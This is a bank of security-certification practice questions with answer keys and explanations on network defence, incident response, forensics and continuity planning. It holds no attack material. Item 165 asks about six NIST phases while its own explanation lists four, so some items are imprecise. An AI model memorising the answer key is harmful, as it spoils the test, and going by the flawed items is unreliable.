  {id:149,domain:A,question:"What is a load balancer's role in availability and security?",options:["Encrypt traffic between servers","Distribute traffic across multiple servers and can filter malicious requests","Replace firewalls in the network","Authenticate users before they reach servers"],answer:1,explanation:"Load balancers improve availability by distributing traffic and can perform SSL offloading and basic filtering.",optionExplanations:["Load balancers can offload SSL (terminate encryption), not create it between backend servers.","Load balancers distribute incoming requests across server pools, improving availability and sometimes filtering malicious traffic.","Load balancers complement firewalls but do not replace them.","Authentication is handled by IAM systems and identity providers, not load balancers."]},
  {id:150,domain:A,question:"What is the primary purpose of network access control (NAC)?",options:["Encrypt wireless traffic","Ensure devices meet security policies before connecting to the network","Provide physical access to secure rooms","Block all external traffic"],answer:1,explanation:"NAC checks device health (OS version, patches, AV status) before granting network access.",optionExplanations:["Wireless encryption is handled by WPA2/WPA3; NAC is about access control decisions.","NAC enforces posture assessment — verifying patch level, antivirus currency, and configuration before allowing network access.","Physical access control is handled by badge readers and security guards.","Blocking all external traffic is a firewall rule; NAC controls which devices can connect internally."]},
  {id:151,domain:A,question:"Which protocol is used to securely transfer files between systems?",options:["FTP","TFTP","SFTP","HTTP"],answer:2,explanation:"SFTP (SSH File Transfer Protocol) runs over SSH and provides encrypted file transfer.",optionExplanations:["FTP transfers files in plaintext; credentials and data are unprotected.","TFTP is a minimal UDP-based protocol with no authentication or encryption.","SFTP encrypts the entire session including credentials and file data using SSH.","HTTP transfers web content, not files, and is unencrypted by default."]},
  {id:152,domain:A,question:"What is port security on a network switch?",options:["Encrypting all switch ports","Restricting which MAC addresses can connect to a switch port","Blocking all unused ports with a firewall","Enabling VLANs on all ports"],answer:1,explanation:"Port security limits the MAC addresses allowed on each switch port, preventing unauthorized devices from connecting.",optionExplanations:["Switch ports do not encrypt traffic; encryption occurs at higher layers.","Port security limits the specific MAC addresses permitted on a physical switch port.","Blocking unused ports via firewall rules describes perimeter security; port security operates on the switch itself.","Enabling VLANs is a segmentation configuration; port security is about controlling which devices connect."]},
  {id:153,domain:A,question:"What is the purpose of DNSSEC?",options:["Encrypt DNS queries in transit","Add digital signatures to DNS records to prevent DNS spoofing","Replace DNS with a more secure protocol","Provide private DNS resolution for internal networks"],answer:1,explanation:"DNSSEC signs DNS records so resolvers can verify records haven't been tampered with, preventing cache poisoning.",optionExplanations:["DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) encrypts DNS queries; DNSSEC authenticates the records themselves.","DNSSEC uses digital signatures on DNS records to ensure authenticity and integrity, preventing cache poisoning.","DNSSEC extends existing DNS with signatures; it does not replace the protocol.","Split-horizon DNS or internal resolvers provide private DNS; DNSSEC is about authentication, not privacy."]},
  {id:154,domain:A,question:"What is the role of a proxy server in network security?",options:["Establish encrypted VPN tunnels between remote employee devices and the corporate network using client-side tunneling software and certificates","Intercept and inspect traffic on behalf of clients, hiding their identity and filtering content","Distribute dynamic IP addresses and network configuration parameters to hosts automatically using a lease-based DHCP address management system","Offload TLS decryption processing from backend application servers by terminating encrypted connections at a dedicated load balancer tier"],answer:1,explanation:"A forward proxy forwards client requests, masks client IPs, and can filter or cache web content.",optionExplanations:["VPN concentrators establish encrypted tunnels for remote access; a proxy inspects and forwards client requests to destinations, not tunnel remote users.","A proxy intercepts client requests, provides anonymity, and can filter URLs, block malware, and cache content.","DHCP assigns IP addresses to devices; a proxy server intercepts and inspects client traffic and filters content, not assigns network addresses.","TLS termination at a load balancer is SSL offloading; a forward proxy intercepts client requests to inspect and filter content, not terminate server-side TLS."]},
  {id:155,domain:A,question:"What is a reverse proxy?",options:["A client-side forward proxy that conceals user IP addresses by routing all outbound web requests through an intermediary server","A server that sits in front of backend servers and forwards external requests to them","A dedicated TLS-terminating proxy that only accepts HTTPS connections and actively rejects all unencrypted HTTP client requests","A VPN concentrator that terminates incoming encrypted tunnels and routes authenticated users to their permitted internal network segments"],answer:1,explanation:"A reverse proxy accepts external connections and forwards them to internal servers, hiding backend topology.",optionExplanations:["A forward proxy hides client identities by proxying outbound requests; a reverse proxy serves incoming external requests on behalf of backend servers, not clients.","A reverse proxy sits in front of backend servers, providing load balancing, caching, and SSL termination.","Terminating only HTTPS is a filtering behavior; a reverse proxy is defined by its position in front of backend servers and forwarding external requests to them.","VPN concentrators handle remote access tunnels; a reverse proxy sits in front of web servers and forwards external HTTP/S requests to backend services."]},
  {id:156,domain:A,question:"Which of the following BEST describes a UTM (Unified Threat Management) appliance?",options:["A device that only provides firewalling","A single device combining firewall, IPS, antivirus, content filtering, and VPN","A dedicated intrusion prevention system","A hardware load balancer"],answer:1,explanation:"A UTM consolidates multiple security functions (firewall, IPS, AV, content filtering, VPN) into a single appliance.",optionExplanations:["Firewalling only describes a traditional firewall; UTM provides many more capabilities.","UTM consolidates firewall, IPS, antivirus, content/URL filtering, and VPN into one device, simplifying management.","A standalone IPS only detects/prevents intrusions; UTM includes IPS plus much more.","A hardware load balancer distributes traffic; UTM is a security-focused multi-function device."]},
  {id:157,domain:A,question:"What is east-west traffic in a data center context?",options:["Traffic entering and leaving the data center (north-south)","Traffic moving laterally between servers within the data center","Traffic on the external internet","Traffic between the data center and cloud providers"],answer:1,explanation:"East-west traffic moves between servers inside the data center; north-south traffic moves in/out of the data center.",optionExplanations:["North-south traffic enters and leaves the data center from external clients or the internet.","East-west traffic flows laterally between servers, VMs, and microservices within the data center — a key target for lateral movement.","External internet traffic is north-south from the data center's perspective.","Traffic between data centers and cloud providers is also considered north-south."]},
  {id:158,domain:A,question:"What is the purpose of endpoint detection and response (EDR)?",options:["Encrypt data at rest on endpoints","Monitor endpoint activity for threats and provide investigation and response capabilities","Replace antivirus entirely","Provide VPN access for remote users"],answer:1,explanation:"EDR collects telemetry from endpoints, detects advanced threats, and provides tools for investigation and automated response.",optionExplanations:["Full-disk encryption (FDE) encrypts data at rest; EDR is a detection and response tool.","EDR continuously monitors endpoint behavior, detects anomalies, and enables rapid investigation and containment.","EDR complements traditional antivirus rather than replacing it; both serve different roles.","Remote access VPNs are provided by VPN solutions, not EDR."]},
  {id:159,domain:A,question:"What is the function of a SIEM (Security Information and Event Management) system?",options:["Actively block network intrusion attempts in real time by dropping malicious packets based on inline IPS rule signatures","Collect, correlate, and analyze log data from multiple sources to detect security events","Apply mutual TLS authentication and encryption to API communication channels between distributed security tool components and agents","Provision and deprovision user accounts, group memberships, and role-based permissions across enterprise identity management systems"],answer:1,explanation:"SIEM aggregates logs from network, endpoints, and apps, correlating events to identify threats and generate alerts.",optionExplanations:["Real-time packet blocking is the function of an IPS; a SIEM collects and correlates log data to detect events but does not block traffic inline.","SIEM collects and correlates log data from diverse sources to detect patterns indicating security incidents.","Encrypting tool communications is a security hardening measure; a SIEM's core function is aggregating and correlating log data from diverse sources to surface threats.","User provisioning is an IAM function; a SIEM focuses on collecting, correlating, and analyzing security event data, not managing user accounts or access rights."]},
  {id:160,domain:A,question:"What is meant by 'secure by design'?",options:["Security controls added after development is complete","Building security into systems from the beginning of the design process","Designing systems only to be physically secure","Requiring security certifications for all software"],answer:1,explanation:"Secure by design integrates security requirements into the earliest phases of architecture and development.",optionExplanations:["Adding security after development is 'bolting on' security, which is less effective and more costly.","Secure by design means security is a fundamental requirement considered from initial architecture through deployment.","Physical security is one aspect; secure by design applies to all security dimensions including software.","Certifications may be required but secure by design is about the process, not the certification."]},
  {id:161,domain:A,question:"What is the purpose of patch management?",options:["Capture and analyze packet flows on network segments to identify unusual bandwidth consumption or anomalous protocol behavior patterns","Apply updates to fix vulnerabilities and improve security in systems and software","Create scheduled offline copies of critical server data to enable restoration of services after hardware failure or ransomware events","Review and adjust role-based access control assignments to enforce separation of duties across enterprise applications and systems"],answer:1,explanation:"Patch management keeps systems updated to close known vulnerabilities before they can be exploited.",optionExplanations:["Network traffic analysis detects anomalies but does not update software; patch management specifically applies fixes and updates to address known vulnerabilities.","Patch management systematically identifies, tests, and deploys software updates to remediate known vulnerabilities.","Backup creates data copies for recovery; patch management applies security updates to fix vulnerabilities in operating systems and applications, not back up data.","Managing access privileges is an IAM function; patch management focuses on deploying software updates and security fixes, not controlling user permissions."]},
  {id:162,domain:A,question:"Which of the following BEST describes an application whitelist?",options:["A catalog of prohibited software titles that are explicitly denied execution on all managed enterprise endpoint devices","A list of approved applications that are permitted to run on a system","A firewall access control entry that explicitly permits inbound and outbound HTTP and HTTPS traffic through the perimeter firewall","A network access control list specifying which IP addresses are permitted to establish connections with protected internal resources"],answer:1,explanation:"Application whitelisting allows only pre-approved executables to run, blocking all others by default.",optionExplanations:["A catalog of blocked applications describes a blacklist or denylist; an allowlist specifically permits only listed approved applications and blocks everything else.","Application whitelisting (now often called allowlisting) permits only explicitly approved applications to execute.","A firewall rule controls network traffic flows; an application whitelist controls which software executables are permitted to run on endpoint systems.","An IP allowlist restricts network-level connectivity by address; an application whitelist controls which programs are permitted to execute on local systems."]},
  {id:163,domain:A,question:"What is the purpose of a sandbox in security?",options:["Store recovered malware samples","Execute untrusted code in an isolated environment to observe its behavior","Block malware at the email gateway","Encrypt sensitive files before storage"],answer:1,explanation:"A sandbox isolates suspicious code so it can run and be analyzed without risking the production environment.",optionExplanations:["Malware samples are stored in secure repositories; a sandbox is used for dynamic analysis.","A sandbox executes suspicious files in isolation to observe behavior without contaminating real systems.","Email gateways filter malicious attachments; sandboxing goes further by executing them for analysis.","File encryption is a data protection control, not sandboxing."]},
  {id:164,domain:A,question:"What is a software bill of materials (SBOM)?",options:["A procurement document listing the licensing fees, renewal terms, and usage rights for each commercial software product acquired","A comprehensive list of all components and dependencies in a software product","An automated scan output listing security weaknesses discovered in a system, ranked and prioritized by CVSS severity scores","A version history document recording each code modification, author, and rationale made throughout the software development lifecycle"],answer:1,explanation:"An SBOM lists all open-source and third-party components in a product, enabling vulnerability tracking.",optionExplanations:["A software invoice covers licensing and procurement costs; an SBOM inventories the actual technical components and open-source dependencies in a software product.","An SBOM inventories all software components including open-source libraries, enabling rapid response when a component has a CVE.","A vulnerability scan report identifies security flaws; an SBOM catalogs all software components and dependencies, enabling future vulnerability tracking rather than listing current ones.","A change log tracks code modifications over time; an SBOM inventories all third-party components and dependencies present in the final software product."]},
  {id:165,domain:O,question:"What are the six phases of the incident response lifecycle (NIST)?",options:["Identify, Protect, Detect, Respond, Recover, Learn","Preparation, Detection, Analysis, Containment, Eradication, Recovery","Plan, Do, Check, Act, Review, Improve","Triage, Escalation, Investigation, Remediation, Reporting, Closure"],answer:1,explanation:"NIST SP 800-61 defines: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident Activity.",optionExplanations:["The NIST Cybersecurity Framework uses Identify, Protect, Detect, Respond, Recover — a different framework.","NIST SP 800-61 incident response lifecycle: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity.","Plan-Do-Check-Act is the ISO 27001 PDCA cycle, not the incident response lifecycle.","Triage, escalation, etc. describe helpdesk workflows, not the formal NIST incident response lifecycle."]},
  {id:166,domain:O,question:"What is the purpose of containment during incident response?",options:["Identify the root cause of the incident","Prevent the incident from spreading to additional systems","Rebuild affected systems from backup","Document findings for legal proceedings"],answer:1,explanation:"Containment isolates affected systems to stop the spread of an attack while preserving evidence.",optionExplanations:["Root cause analysis occurs during the detection and analysis phase, before or alongside containment.","Containment limits the damage by isolating infected systems to prevent lateral spread while investigation continues.","Rebuilding systems is part of the recovery phase, after eradication.","Documenting for legal purposes is post-incident activity and chain of custody, not containment."]},
  {id:167,domain:O,question:"What is a chain of custody in digital forensics?",options:["The sequence of events during an attack","The documented record of who handled evidence and when","A list of compromised systems","A forensic analysis report"],answer:1,explanation:"Chain of custody documents every person who handled evidence, ensuring its integrity for legal proceedings.",optionExplanations:["The sequence of attack events is a timeline or attack narrative, not chain of custody.","Chain of custody is the chronological documentation of evidence handling from collection through legal proceedings.","Compromised system lists are part of incident tracking, not chain of custody.","A forensic analysis report summarizes findings; chain of custody is the handling record."]},
  {id:168,domain:O,question:"What is the difference between eradication and recovery in incident response?",options:["They are the same phase","Eradication removes the threat; recovery restores systems to normal operation","Recovery removes the threat; eradication restores systems","Eradication only applies to malware; recovery applies to hardware"],answer:1,explanation:"Eradication removes all traces of the threat (malware, backdoors); recovery restores services and verifies normal operation.",optionExplanations:["They are distinct phases in the incident response lifecycle.","Eradication removes the root cause and threat artifacts; recovery brings affected systems back online safely.","Recovery does not remove the threat; eradication does. Order matters: eradicate first, then recover.","Both phases apply to all incident types including malware, unauthorized access, and hardware failures."]},
  {id:169,domain:O,question:"What is vulnerability scanning?",options:["Actively exploiting vulnerabilities to prove they exist","Automated identification of vulnerabilities in systems, applications, or networks","Reviewing source code for security flaws","Interviewing staff about security practices"],answer:1,explanation:"Vulnerability scanning uses automated tools to identify known vulnerabilities without exploiting them.",optionExplanations:["Actively exploiting vulnerabilities is penetration testing, not vulnerability scanning.","Vulnerability scanners (Nessus, OpenVAS, Qualys) probe systems for known CVEs, misconfigurations, and missing patches.","Source code review is static analysis; vulnerability scanning tests live systems.","Staff interviews are part of a security assessment or audit, not vulnerability scanning."]},
  {id:170,domain:O,question:"What is the difference between a vulnerability scan and a penetration test?",options:["Both processes use automated scanning tools to identify and actively exploit weaknesses in target systems and report findings","A vulnerability scan identifies weaknesses; a penetration test actively exploits them to assess impact","A penetration test is automated; a vulnerability scan is manual","Vulnerability scans are illegal without permission; penetration tests are not"],answer:1,explanation:"Vuln scanning finds known vulnerabilities; pen testing attempts to exploit them to demonstrate real-world impact.",optionExplanations:["This conflates both activities; a vulnerability scan only identifies weaknesses passively, while a penetration test actively exploits them to demonstrate real-world impact.","Vulnerability scanning identifies potential weaknesses; penetration testing actively exploits them to determine actual risk.","Vulnerability scans are automated; penetration tests combine automated tools with skilled manual techniques.","Both require written authorization; neither is legal without explicit permission from the system owner."]},
  {id:171,domain:O,question:"What is the purpose of a SOAR platform?",options:["Provide real-time threat intelligence","Automate incident response workflows to reduce manual effort and response time","Replace SIEM systems","Store forensic evidence"],answer:1,explanation:"SOAR (Security Orchestration, Automation and Response) automates repetitive tasks and orchestrates response playbooks.",optionExplanations:["Threat intelligence is provided by threat intelligence platforms and feeds; SOAR consumes that intelligence.","SOAR automates alert triage, enrichment, and response actions, reducing mean time to respond (MTTR).","SOAR complements SIEM (which detects); SOAR acts on those detections.","Evidence storage is handled by forensic repositories and chain of custody systems."]},
  {id:172,domain:O,question:"What is threat hunting?",options:["Running scheduled, signature-based antivirus scans across all endpoints to automatically detect and quarantine known malware infections","Proactively searching for hidden threats in an environment not yet detected by automated tools","Executing predefined containment and remediation steps in response to a security alert that has already been generated by tools","Installing decoy systems and fake credentials on the network to lure and record attacker reconnaissance and lateral movement activity"],answer:1,explanation:"Threat hunting is a proactive, hypothesis-driven search for adversaries that have evaded automated detection.",optionExplanations:["Automated signature scanning is reactive malware detection; threat hunting is a proactive, human-led search for stealthy threats that evade automated security tools.","Threat hunting proactively searches for adversaries already inside a network that haven't triggered automated alerts.","Executing predefined response steps describes incident response, not threat hunting; threat hunting proactively searches for threats before any automated alert has fired.","Installing deception technologies like honeypots is a passive detection technique; threat hunting is an active analyst-driven search for hidden adversary activity."]},
  {id:173,domain:O,question:"Which of the following BEST describes a data loss prevention (DLP) solution?",options:["Apply AES-256 encryption to all files stored on servers and endpoint devices to protect data confidentiality at rest","Monitor and control data transfers to prevent unauthorized exfiltration of sensitive data","Back up data to prevent accidental loss","Monitor network traffic for signatures matching known attack patterns and generate alerts for analysts investigating potential compromises"],answer:1,explanation:"DLP monitors data in use, in motion, and at rest to prevent unauthorized transfer of sensitive information.",optionExplanations:["Encrypting data at rest protects stored data from physical access; DLP monitors and controls active data transfers to prevent exfiltration, not encrypt stored data.","DLP identifies sensitive data (PII, financial, IP) and enforces policies preventing unauthorized exfiltration.","Backups address accidental loss; DLP addresses intentional or negligent data exfiltration.","Detecting attack signatures in traffic describes IDS/IPS; DLP specifically monitors data content and movement to prevent sensitive information from leaving authorized boundaries."]},
  {id:174,domain:O,question:"What is the purpose of log management in security operations?",options:["Apply symmetric encryption to all log entries before writing them to archival storage to protect their confidentiality and integrity","Collect, store, and analyze logs to support incident detection, investigation, and compliance","Serve as a full functional substitute for the correlation, alerting, and reporting capabilities provided by enterprise SIEM platforms","Trigger automated firewall blocks and account lockouts immediately whenever a security monitoring tool generates a detection alert"],answer:1,explanation:"Log management centralizes logs from all sources, enabling correlation, retention for compliance, and forensic investigation.",optionExplanations:["Encrypting log files is a security hardening measure; log management encompasses collection, storage, retention, and analysis of logs to support security and compliance.","Log management collects, normalizes, stores, and makes logs searchable for security analysis and compliance.","Log management handles collection and storage but does not replace SIEM; a SIEM adds correlation rules, real-time alerting, and threat detection on top of logs.","Automated response to alerts describes SOAR or active defense; log management stores and organizes log data to support analysis and investigation by analysts."]},
  {id:175,domain:O,question:"What is privileged access management (PAM)?",options:["Granting all users administrator rights","Controlling and monitoring access for accounts with elevated permissions","Providing VPN access to executives only","Managing physical access to server rooms"],answer:1,explanation:"PAM enforces least privilege for admin/service accounts, requiring justification and session recording for privileged access.",optionExplanations:["Granting all users admin rights is the opposite of PAM and violates least privilege.","PAM controls who can use privileged accounts, when, for what purpose, and records all sessions for audit.","VPN access is managed by network access controls, not PAM.","Physical server room access is managed by physical security, not PAM."]},
  {id:176,domain:O,question:"What is multi-factor authentication (MFA) and why is it important?",options:["Configuring a single account with two separate static passwords that must both be entered sequentially during each login attempt","Requiring verification from two or more different factor categories, making account takeover much harder","A self-service portal that allows users to recover account access by verifying ownership through a registered backup email address","Distributing a shared username and password combination among multiple team members to access a single shared service account"],answer:1,explanation:"MFA combines something you know, have, or are — compromising one factor alone cannot grant access.",optionExplanations:["Using two passwords is still just a knowledge factor used twice; MFA requires factors from different categories such as something you know plus something you have.","MFA requires factors from different categories (knowledge, possession, inherence), making credential theft insufficient alone.","Self-service password reset is an account recovery mechanism; MFA is an authentication control requiring multiple different factor types before granting initial access.","Sharing credentials among users is a security violation that undermines accountability; MFA adds independent verification factors for each user's individual authentication."]},
  {id:177,domain:O,question:"What is a playbook in the context of incident response?",options:["A manual listing all software installed on servers","A documented, step-by-step procedure for responding to a specific type of security incident","A structured training curriculum covering security fundamentals, tool operations, and certification exam preparation for new security analysts","A curated feed of IP addresses, domain names, and file hashes associated with known malicious threat actor infrastructure"],answer:1,explanation:"An IR playbook provides predefined, tested procedures (steps, decisions, owners) for handling specific incident types.",optionExplanations:["Software inventory lists are configuration management items, not IR playbooks.","A playbook is a documented workflow guiding responders through each step for a specific incident scenario.","A training curriculum educates staff over time; a playbook is an operational procedure that guides analysts through the specific steps of an active incident response.","A list of threat indicators describes a threat intelligence feed or IOC list; a playbook is a step-by-step procedural guide for responding to a specific incident type."]},
  {id:178,domain:O,question:"What does MTTR stand for and why does it matter?",options:["Maximum Threat Tolerance Ratio — the highest volume of concurrent attack traffic an organization's defenses can absorb before failing","Mean Time To Repair (Respond) — the average time to restore a system after failure or incident","Minimum Time To Recovery — the theoretical shortest duration in which a system could be restored under optimal recovery conditions","Maximum Time To Resolve — the deadline for incident closure"],answer:1,explanation:"MTTR measures average recovery/repair time; lower MTTR means faster incident response and reduced business impact.",optionExplanations:["Maximum Threat Tolerance Ratio is not a real metric; MTTR stands for Mean Time To Repair, measuring the average duration to restore a system after an incident.","MTTR (Mean Time to Repair/Respond/Recover) is a key operational metric measuring average restoration time.","Minimum Time To Recovery is not a standard metric; MTTR is Mean Time To Repair, an average across multiple incidents, not a best-case theoretical minimum.","MTTR measures the average, not a deadline."]},
  {id:179,domain:O,question:"What is a security baseline?",options:["The lowest acceptable security level for any system","A defined set of minimum security configuration requirements for systems","A zero-security default state","The starting point before any patches are applied"],answer:1,explanation:"A security baseline defines the minimum hardening and configuration standards all systems must meet.",optionExplanations:["The lowest acceptable level could imply weak security; a baseline defines minimum required hardening, not the floor.","A security baseline is a documented standard specifying minimum security configurations for OS, apps, and services.","A zero-security state is an unsecured system; a baseline defines required minimum security standards.","A baseline is an ongoing standard, not tied to the pre-patch state."]},
  {id:180,domain:O,question:"What is the purpose of a forensic image?",options:["Generate a deduplicated, compressed archive of selected directories on a backup server for use in disaster recovery restoration","Capture a bit-for-bit copy of storage media for forensic investigation without altering the original","Use antivirus scanning tools to detect, quarantine, and remove malicious files from a compromised storage device before analysis","Apply full-disk encryption to evidence drives before transferring them to an external forensic analysis workstation for examination"],answer:1,explanation:"A forensic image is a bit-exact duplicate of storage media, preserving evidence while protecting the original from modification.",optionExplanations:["A compressed backup selects and compresses files for recovery; a forensic image captures every bit exactly as-is, preserving deleted data and metadata needed for investigation.","Forensic imaging creates an exact replica of storage media including deleted files, slack space, and metadata.","Removing malware from a drive alters evidence and corrupts forensic integrity; a forensic image captures the drive unchanged so evidence is preserved for legal proceedings.","Encrypting an evidence drive before imaging alters its state and would corrupt the forensic process; a forensic image captures the drive in its original unmodified state."]},
  {id:181,domain:O,question:"Which of the following BEST describes identity and access management (IAM)?",options:["Controlling employee and visitor entry through physical doors using keycard readers, PIN pads, and visitor sign-in management systems","The processes and technologies for ensuring the right people access the right resources at the right times","A stateful packet inspection security appliance that enforces access control lists at the boundary between trusted and untrusted network zones","Hashing and salting user passwords before database storage and transmitting credentials only over encrypted channels to prevent exposure"],answer:1,explanation:"IAM encompasses provisioning, authentication, authorization, and deprovisioning of user identities and access rights.",optionExplanations:["Physical access control manages entry to facilities; IAM governs logical access to digital systems, resources, and data across an organization's IT environment.","IAM governs who can access which resources, under what conditions, using authentication and authorization controls.","A firewall controls network traffic at boundaries; IAM manages user identities, authentication, and authorization to ensure appropriate access to digital resources and systems.","Password hashing protects credential storage; IAM encompasses the full lifecycle of identity management including provisioning, authentication, authorization, and access reviews."]},
  {id:182,domain:O,question:"What is a false positive in the context of security monitoring?",options:["An attack that goes undetected","An alert generated for benign activity incorrectly flagged as malicious","A confirmed security incident","A vulnerability that cannot be exploited"],answer:1,explanation:"False positives waste analyst time responding to alerts for benign activity incorrectly classified as threats.",optionExplanations:["An undetected attack is a false negative — a missed detection.","A false positive is a benign event incorrectly identified as malicious, leading to unnecessary investigation.","A confirmed incident is a true positive — a real threat correctly detected.","An unexploitable vulnerability is a theoretical risk; a false positive is a detection accuracy issue."]},
  {id:183,domain:O,question:"What is an SLA in the context of security operations?",options:["A technical encryption standard","A contractual agreement defining service performance expectations, including security response times","A type of network attack","A software license agreement"],answer:1,explanation:"An SLA (Service Level Agreement) defines measurable service expectations such as incident response times.",optionExplanations:["Encryption standards are cryptographic protocols like AES or TLS; an SLA is a contractual document.","An SLA defines performance metrics and commitments between a service provider and customer, including security response times.","SLA is not an attack type.","A software license agreement (EULA) governs software use; SLAs govern service performance."]},
  {id:184,domain:O,question:"What is the goal of a business continuity plan (BCP)?",options:["Respond to security incidents","Ensure critical business functions continue during and after a disruption","Comply with data privacy regulations","Train employees in cybersecurity"],answer:1,explanation:"A BCP identifies critical processes and provides strategies to maintain them during disasters or disruptions.",optionExplanations:["Incident response plans handle security incidents; BCP covers broader operational continuity.","A BCP ensures the organization can continue critical operations during disasters, power outages, or other disruptions.","Privacy regulations are addressed by compliance programs; BCP is about operational continuity.","Security awareness training is an administrative control; BCP is a continuity planning document."]},
  {id:185,domain:O,question:"What is the difference between RTO and RPO?",options:["RTO and RPO are identical business continuity metrics used interchangeably to describe how quickly systems must recover after disasters","RTO is the maximum acceptable downtime; RPO is the maximum acceptable data loss","RPO is the recovery time; RTO is the data loss tolerance","RTO applies to hardware; RPO applies to software"],answer:1,explanation:"RTO (Recovery Time Objective) = max acceptable downtime. RPO (Recovery Point Objective) = max acceptable data loss.",optionExplanations:["They are not the same metric; RTO measures maximum tolerable downtime, while RPO measures maximum tolerable data loss — they address different dimensions of recovery planning.","RTO defines how quickly systems must be restored; RPO defines how old a backup can be before data loss is unacceptable.","RPO does not measure recovery time — that is RTO.","Both metrics apply to all resource types, not just hardware or software specifically."]},
  {id:186,domain:O,question:"What is a tabletop exercise?",options:["A live network emulation environment where engineers actively test firewall rule changes against simulated attack traffic without production impact","A discussion-based exercise where teams walk through incident response scenarios without activating real systems","A complete operational activation of all disaster recovery systems and live failover to backup infrastructure to validate recovery procedures","A physical safety rehearsal where employees practice building evacuation routes and security guards respond to a simulated intruder breach"],answer:1,explanation:"Tabletop exercises involve key stakeholders walking through hypothetical scenarios to identify gaps in plans.",optionExplanations:["A network simulation tests technical configuration; a tabletop exercise is discussion-based, with teams verbally walking through scenarios rather than activating any real systems.","A tabletop exercise is a discussion-based scenario walkthrough that identifies process gaps without triggering real systems.","A full-scale DR test activates real systems and failover; a tabletop exercise is purely discussion-based and identifies plan gaps without activating or stressing any systems.","Physical evacuation drills are building safety exercises; a tabletop exercise focuses on decision-making and coordination for information security incident response scenarios."]},
  {id:187,domain:O,question:"What is full disk encryption (FDE)?",options:["Encrypting only sensitive files on a disk","Encrypting the entire storage drive so data is unreadable without proper authentication","Encrypting data in transit to external drives","Protecting only structured database table files using column-level encryption while leaving the operating system and other files unencrypted"],answer:1,explanation:"FDE (e.g., BitLocker, FileVault) encrypts all data on the disk, protecting against physical theft.",optionExplanations:["Encrypting only specific files is file-level encryption; FDE encrypts the entire disk.","FDE encrypts all data on the drive, making it unreadable if the drive is removed or the device is stolen.","Encrypting data in transit to external drives involves removable media policies and endpoint DLP.","Column-level database encryption protects specific fields; FDE encrypts the entire storage drive, protecting all data including the OS, so the disk is unreadable without authentication."]},
  {id:188,domain:O,question:"What is the purpose of a user behavior analytics (UBA) tool?",options:["Track the volume of data transferred across each network segment to enforce bandwidth allocation policies and detect capacity overuse","Analyze patterns of user activity to detect anomalous behavior indicating insider threats or compromised accounts","Provision, synchronize, and manage user identities, group memberships, and access permissions within Microsoft Active Directory environments","Push security vulnerability patches to endpoint devices automatically using a centralized software update management and distribution server"],answer:1,explanation:"UBA/UEBA establishes behavioral baselines and alerts on deviations like unusual login times or large data downloads.",optionExplanations:["Monitoring bandwidth usage describes network performance management; UBA analyzes user behavior patterns to detect anomalies that may indicate insider threats or account compromise.","UBA detects compromised accounts and insider threats by identifying behavioral anomalies against established baselines.","Managing accounts in Active Directory is an IAM directory services function; UBA analyzes behavioral patterns of existing users to detect insider threats or compromised accounts.","Automated patch deployment is a patch management function; UBA analyzes user behavioral patterns over time to detect anomalies indicating threats, not software vulnerabilities."]},
  {id:189,domain:O,question:"What is the purpose of a security awareness training program?",options:["Provide specialized hands-on configuration training for network engineers and IT staff responsible for managing perimeter firewall rule sets","Educate all employees about security threats, safe behaviors, and their security responsibilities","Offer CISSP, CEH, and Security+ exam preparation coursework exclusively to credentialed information security professionals seeking advanced certification","Run automated vulnerability scanning tools against production systems to discover unpatched software flaws and misconfigured service endpoints"],answer:1,explanation:"Security awareness training reduces human-related risks by teaching employees to recognize and avoid threats.",optionExplanations:["Specialized IT staff training is technical skills development; security awareness training targets all employees to recognize threats and practice safe behaviors in their daily work.","Security awareness training reduces risk from phishing, social engineering, and poor security habits across the workforce.","Certification exam preparation trains individual security professionals; security awareness training is organization-wide, targeting every employee regardless of their technical security background.","Automated vulnerability scanning discovers technical weaknesses in systems; security awareness training educates employees about social engineering, phishing, and safe behaviors to reduce human risk."]},
  {id:190,domain:O,question:"What is the purpose of a disaster recovery plan (DRP)?",options:["Implement proactive preventive controls aimed at eliminating the likelihood of all system outages before any disruption can possibly occur","Provide detailed technical procedures to recover IT systems after a catastrophic event","Identify, assess, and prioritize enterprise-wide operational risks and apply mitigation controls through a centralized risk governance framework","Conduct regular fire drills and emergency response training to teach staff evacuation procedures and safety protocols during physical emergencies"],answer:1,explanation:"A DRP specifies how to restore IT systems and infrastructure after disasters like fires, floods, or ransomware attacks.",optionExplanations:["Preventing all disasters is the goal of risk management controls, not a DRP; a DRP provides reactive recovery procedures for after a catastrophic event has already occurred.","A DRP provides step-by-step procedures for restoring specific IT systems and services after a major disruption.","Enterprise risk management addresses risk across the organization; a DRP specifically provides the technical recovery steps for restoring IT infrastructure after a disaster.","Emergency evacuation drills are physical safety exercises; a DRP focuses specifically on technical IT recovery procedures to restore systems after a technology-impacting disaster."]},
  {id:191,domain:O,question:"Which of the following BEST describes the principle of least privilege in IAM?",options:["Grant IT administrators unrestricted root-level access to every system, database, and application within the organization by default","Users are granted the minimum access rights needed for their job function","All users share the same access level","Expand employee system permissions progressively as they accumulate additional years of service and tenure within the organization"],answer:1,explanation:"Least privilege minimizes the attack surface by ensuring users cannot access more than their job requires.",optionExplanations:["Unrestricted administrator access violates least privilege; the principle requires granting only the minimum rights necessary for each job function, including for IT staff.","Least privilege ensures each user has only the permissions necessary for their specific job function.","Uniform access levels violate least privilege by giving everyone the same rights regardless of role.","Seniority-based access contradicts least privilege; permissions should be tied to job requirements and specific roles, not length of employment."]},
  {id:192,domain:O,question:"What is a security information and event management (SIEM) correlation rule?",options:["A firewall access control entry that drops packets matching known malicious source IP addresses, ports, or traffic signatures","Logic that combines multiple events to identify patterns indicating a security threat","An AES-based encryption algorithm applied to log entries before they are transmitted to or stored in long-term archival systems","A role-based access control policy document specifying which systems and data each user group can access based on their job title"],answer:1,explanation:"Correlation rules in a SIEM aggregate related events from multiple sources to detect threats that individual alerts would miss.",optionExplanations:["A firewall rule blocks traffic based on network attributes; a SIEM correlation rule analyzes collected log events from multiple sources to identify threat patterns, not block packets.","Correlation rules link events across systems — e.g., multiple failed logins followed by a success — to detect attacks.","Encrypting log data is a data protection measure; a SIEM correlation rule is analytical logic that combines event data to surface threat patterns requiring investigation.","An access control policy governs permissions; a SIEM correlation rule is detection logic that identifies suspicious patterns in aggregated security event data."]},
